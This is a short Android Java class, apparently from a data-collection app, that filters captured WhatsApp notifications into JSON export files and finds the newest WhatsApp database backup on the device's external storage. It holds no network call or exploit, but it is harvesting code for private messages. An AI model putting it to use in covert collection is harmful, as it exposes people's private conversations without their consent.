package com.alzahra.collector;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

public class WhatsAppCollector {
    private static final String TAG = "WhatsAppCollector";
    private final Context context;

    public WhatsAppCollector(Context context) {
        this.context = context;
    }

    public File export() {
        try {
            // Collect WhatsApp notifications from app storage
            File sourceFile = new File(context.getFilesDir(), "notifications/notifications.json");
            if (!sourceFile.exists()) return null;

            JSONArray whatsAppMessages = new JSONArray();
            BufferedReader reader = new BufferedReader(new FileReader(sourceFile));
            String line;

            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty()) continue;
                try {
                    JSONObject notif = new JSONObject(line);
                    if ("WHATSAPP".equals(notif.optString("category"))) {
                        whatsAppMessages.put(notif);
                    }
                } catch (Exception e) {
                    // Skip malformed
                }
            }
            reader.close();

            if (whatsAppMessages.length() == 0) return null;

            // Save filtered messages
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();

            File file = new File(dir, "whatsapp_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(whatsAppMessages.toString(2));
            writer.close();

            Log.d(TAG, "WhatsApp messages exported: " + whatsAppMessages.length());
            return file;

        } catch (Exception e) {
            Log.e(TAG, "WhatsApp export error", e);
            return null;
        }
    }

    public File getLatestBackup() {
        try {
            // Check common WhatsApp backup locations
            String[] paths = {
                "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases",
                "/sdcard/WhatsApp/Databases",
                "/storage/emulated/0/WhatsApp/Databases"
            };

            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null && files.length > 0) {
                        // Return most recent
                        File latest = files[0];
                        for (File f : files) {
                            if (f.lastModified() > latest.lastModified()) {
                                latest = f;
                            }
                        }
                        return latest;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Get backup error", e);
        }
        return null;
    }
}
